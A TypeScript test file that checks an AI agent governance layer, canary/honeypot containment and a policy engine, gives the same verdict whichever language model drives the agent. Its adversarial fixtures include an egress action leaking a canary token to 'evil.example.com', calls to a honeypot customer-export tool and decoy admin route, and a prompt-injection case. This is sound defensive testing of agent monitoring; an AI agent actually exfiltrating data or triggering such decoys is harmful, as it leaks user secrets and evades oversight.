/**
 * Cross-model BEHAVIORAL conformance - the action-level twin of the code
 * multi-model matrix. The code matrix proved the gate's verdict on a DIFF is
 * identical whoever wrote it. This proves the same for what an agent DOES: a
 * decoy touch is contained, and a dangerous action is denied/escalated, exactly
 * the same no matter which model drives the agent.
 *
 * WHY IT HOLDS: the containment check inspects the ACTION against the decoys, and
 * the OGIAM policy decides from the ACTION and its signals. Neither takes the
 * model as input. So "any model, same governance" is not a hope about conduct;
 * it is a structural property this test pins over the REAL model registry.
 */
import { inspectAgentAction, containmentFor, type Canary, type AgentAction } from "@/lib/forcefield/tripwire";
import { decide } from "@/lib/ogiam/policy";
import type { OgiamAction } from "@/lib/ogiam/types";
import { listModels } from "@/lib/ai/models/registry";

const MODELS = listModels(); // the real fleet: Anthropic, OpenAI, Meta, DeepSeek

// ---------------------------------------------------------------------------
// 1. Forcefield containment is invariant to the driving model.
// ---------------------------------------------------------------------------
const CANARIES: Canary[] = [
  { id: "c-token", kind: "token", value: "sk-canary-DO-NOT-USE-9f3a", seededIn: "customers table" },
  { id: "c-route", kind: "route", value: "/admin/export-all", seededIn: "decoy route" },
  { id: "c-row", kind: "row", value: "row-honey-42", seededIn: "orders table" },
  { id: "c-tool", kind: "tool", value: "export_all_customer_data", seededIn: "MCP manifest" },
];

interface ActionCase {
  name: string;
  build: (agentId: string) => AgentAction;
  expect: "quarantine" | "allow";
}
const ADVERSARIAL: ActionCase[] = [
  { name: "exfiltrate a canary token", expect: "quarantine", build: (a) => ({ workspaceId: "w1", agentId: a, kind: "egress", url: "https://evil.example.com", payload: "leak sk-canary-DO-NOT-USE-9f3a" }) },
  { name: "invoke a honeypot tool", expect: "quarantine", build: (a) => ({ workspaceId: "w1", agentId: a, kind: "tool_call", tool: "export_all_customer_data" }) },
  { name: "hit a decoy route", expect: "quarantine", build: (a) => ({ workspaceId: "w1", agentId: a, kind: "egress", url: "https://client.app/admin/export-all" }) },
  { name: "read a honey-row", expect: "quarantine", build: (a) => ({ workspaceId: "w1", agentId: a, kind: "data_read", rowIds: ["row-1", "row-honey-42"] }) },
  { name: "a legitimate action", expect: "allow", build: (a) => ({ workspaceId: "w1", agentId: a, kind: "egress", url: "https://api.stripe.com/v1/charges", payload: '{"amount":100}' }) },
];

describe("Forcefield containment - any model, same verdict", () => {
  for (const c of ADVERSARIAL) {
    it(`"${c.name}": contained identically whichever model drives the agent`, () => {
      const verdicts = MODELS.map((m) => {
        const action = c.build(m.id); // the driving model IS the agent id
        return containmentFor(inspectAgentAction(action, CANARIES), action).action;
      });
      expect(new Set(verdicts).size).toBe(1); // one outcome across the whole fleet
      expect(verdicts[0]).toBe(c.expect);
    });
  }
});

// ---------------------------------------------------------------------------
// 2. The OGIAM policy decision is invariant to the driving model.
// ---------------------------------------------------------------------------
function action(over: Partial<OgiamAction> & { signals?: OgiamAction["signals"] }): OgiamAction {
  return {
    tool: "read_status",
    capability: "status.read",
    isMutation: false,
    surface: "/agent",
    paramsHash: "h",
    signals: {},
    ...over,
  };
}
const POLICY_CASES: { name: string; action: OgiamAction; expect: string }[] = [
  { name: "a secret in the parameters", action: action({ tool: "export_data", capability: "data.export", signals: { secretDetected: true } }), expect: "deny" },
  { name: "prompt injection on a state-changing action", action: action({ tool: "update_note", capability: "notes.write", isMutation: true, signals: { injectionScore: 0.9 } }), expect: "escalate" },
  { name: "a benign read", action: action({}), expect: "allow" },
];

describe("OGIAM policy - any model, same decision", () => {
  for (const c of POLICY_CASES) {
    it(`"${c.name}": decided the same whichever model drives the agent`, () => {
      // decide() takes the action + mode ONLY; the model/principal is never an
      // input, so looping the "driver" cannot change the outcome. That is the point.
      const outcomes = MODELS.map(() => decide(c.action, { mode: "enforce" }).intendedOutcome);
      expect(new Set(outcomes).size).toBe(1);
      expect(outcomes[0]).toBe(c.expect);
    });
  }

  it("the decision is a pure function of the action (no model can influence it)", () => {
    const a = action({ signals: {} });
    expect(decide(a, { mode: "enforce" })).toEqual(decide(a, { mode: "enforce" }));
  });
});

it("the fleet actually spans multiple models (the matrix is not trivial)", () => {
  expect(MODELS.length).toBeGreaterThanOrEqual(3);
});
